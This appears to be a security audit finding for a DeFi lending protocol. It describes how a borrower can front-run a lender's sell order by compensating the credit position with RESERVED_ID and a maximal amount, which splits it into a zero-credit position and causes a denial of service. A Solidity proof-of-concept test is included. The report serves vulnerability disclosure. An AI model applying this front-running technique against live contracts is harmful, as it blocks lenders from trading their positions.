# Vulnerability details

## Impact
A borrower can split a lender's credit position `(id: A, credit: K)` into two credit positions `(id: A, credit: K - amountToSplit)` and `(id: B, credit: amountToSplit)`. In the code, there is no checks for `K - amountToSplit` is equal to zero or not. Because of that, an attacker can cause a DoS when the lender sells the original credit position of id A by these steps:
1. Bob (the attacker) sells credit to Alice. Alice has a credit position `(id: A, credit: K)`.
2. Alice sells the credit position of id A to Candy.
3. Bob front-run Alice's sell market order with compensating credit position of id A with `creditPositionToCompensateId = RESERVED_ID` and `amount = type(uint256).max`, which resulting in splitting of the credit position into `(id: A, credit: 0)` and `(id: B, credit: K)`.
4. Alice's sell market order reverts because the credit position of id A has been repaid.

Note that, if Alice sells the credit position of id B, then Bob can repeat this attack again.

Same idea can be applied to DoS on buy credit market order.

## Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import {BaseTest} from "@test/BaseTest.sol";
import {YieldCurveHelper} from "@test/helpers/libraries/YieldCurveHelper.sol";
import {RESERVED_ID} from "@src/libraries/LoanLibrary.sol";

contract POC is BaseTest {
    function test() public {
        _deposit(alice, weth, 200e18);
        _deposit(alice, usdc, 100e6);
        _deposit(bob, weth, 100e18);
        _deposit(bob, usdc, 100e6);
        _deposit(candy, usdc, 200e6);

        _buyCreditLimit(alice, block.timestamp + 365 days, YieldCurveHelper.pointCurve(365 days, 1e18));
        _buyCreditLimit(candy, block.timestamp + 365 days, YieldCurveHelper.pointCurve(365 days, 1e18));

        uint256 tenor = 365 days;
        uint256 amount = 20e6;

        // Bob sells credit to Alice
        uint256 debtPositionId = _sellCreditMarket(bob, alice, RESERVED_ID, amount, tenor, false);

        uint256 creditPositionId = size.getCreditPositionIdsByDebtPositionId(debtPositionId)[0];

        // Bob compensates creditPosition in full with creditPositionToCompensateId == RESERVED_ID
        // As a result, Bob changed the creditPositionId of creditPosition
        _compensate(bob, creditPositionId, RESERVED_ID);

        // Alice can not sell creditPosition based on the old creditPositionId
        // Revert with CREDIT_POSITION_NOT_TRANSFERRABLE(status = LoanStatus.REPAID) 
        vm.expectRevert();
        _sellCreditMarket(alice, candy, creditPositionId, amount, tenor, false);
    }
}
```
